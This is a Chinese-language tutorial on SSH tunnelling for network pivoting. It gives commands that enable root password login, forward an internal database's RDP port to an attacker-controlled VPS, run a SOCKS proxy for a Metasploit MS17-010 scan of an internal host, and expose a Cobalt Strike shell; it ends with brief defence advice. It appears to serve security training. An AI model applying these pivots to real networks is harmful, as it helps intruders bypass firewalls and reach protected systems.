### SSH协议与隧道技术

#### 概述
在内网环境中，大多数Linux服务器和网络设备均支持SSH协议。由于SSH协议通常被允许通过防火墙和边界设备，因此它常成为攻击者的目标。此外，SSH传输过程中的加密特性使得区分合法会话与恶意活动变得困难。一旦攻击者利用SSH端口隧道突破了防火墙限制，他们便能够建立之前无法实现的TCP连接。

#### 创建SSH隧道的常用参数
- `-C`：启用压缩以提高传输速度。
- `-f`：将SSH进程放入后台运行，不占用当前shell。
- `-N`：仅创建一个静默连接（即不打开远程登录会话）。
- `-g`：允许远程主机连接本地用于转发的端口。
- `-L [绑定地址]:本地端口:目标地址:目标端口`：指定本地端口转发规则。
- `-R [绑定地址]:远程端口:目标地址:目标端口`：指定远程端口转发规则。
- `-D [绑定地址]:端口`：启动SOCKS代理服务。
- `-P`：指定SSH服务器监听的端口号（默认为22）。

### 1. 本地端口转发示例
**场景设定**  
- 外部VPS可以访问内网Web服务器，但不能直接访问数据库服务器。
- 内网Web服务器能与数据库服务器互相通信。
- 目标是通过Web服务器作为跳板访问数据库服务器的3389端口。

**步骤**
1. 修改SSH服务器配置文件 `/etc/ssh/sshd_config` 以允许root用户登录并重启服务：
   ```bash
   PermitRootLogin yes
   Port 22
   PasswordAuthentication yes
   service ssh restart
   ```
2. 在外部VPS上执行以下命令来设置本地端口转发：
   ```bash
   ssh -fCNg -L 1153:192.168.190.136:3389 user@webserver_ip -p 22
   ```
3. 使用 `netstat -anptl | grep 1153` 确认本地1153端口已开启监听。
4. 通过 `rdesktop 127.0.0.1:1153` 连接到VPS上的1153端口，从而间接访问数据库服务器的3389端口。

### 2. 远程端口转发示例
**场景设定**  
- 攻击者控制的VPS位于外网。
- 内网包含三台机器：Web服务器、数据库服务器及域控制器。
- 内网无直接通往外网的路径；仅Web服务器可访问外网VPS。

**目标**  
从外网VPS访问数据库服务器的3389端口。

**步骤**
1. 在内网Web服务器上执行命令：
   ```bash
   ssh -fCNg -R 1521:192.168.190.136:3389 user@vps_ip -p 22
   ```
2. 使用 `netstat -anptl | grep 1521` 验证VPS是否正在监听1521端口。
3. 通过 `rdesktop 127.0.0.1:1521` 从VPS访问数据库服务器的3389端口。

### 3. 动态端口转发 (SOCKS代理)
**场景设定**  
需要通过VPS访问内网资源，并希望使用浏览器或其他支持SOCKS协议的应用程序进行交互。

**步骤**
1. 在VPS上创建动态SOCKS代理通道：
   ```bash
   ssh -fCNg -D 7000 user@vps_ip
   ```
2. 设置本地应用程序（如浏览器或Metasploit）使用该代理。
3. 利用Metasploit扫描或攻击内网目标，例如：
   ```bash
   msfconsole -q
   setg proxies socks5:vps_ip:7000
   use auxiliary/scanner/smb/smb_ms17_010
   set rhosts 192.168.190.132
   set threads 10
   run
   ```

### 4. X 协议转发
当需要远程运行图形界面应用时，可以通过SSH启用X协议转发功能。这类似于VNC和X Windows系统的工作方式。
```bash
ssh -X user@remote_host
```

### 5. 实战中的SSH隧道应用
如果公网服务器缺少必要的工具（如Metasploit），则可通过构建SSH隧道将特定服务暴露给外部网络。例如，将Cobalt Strike shell转发至公网VPS的一个开放端口上，以便后续操作。

### 6. SSH隧道防御策略
为了防止未经授权的SSH隧道建立，应采取如下措施：
- 严格控制对SSH服务的访问权限，仅允许来自白名单IP地址的连接。
- 在ACL中明确指定哪些主机可以发起SSH请求。
- 启用带外管理机制以进一步增强安全性。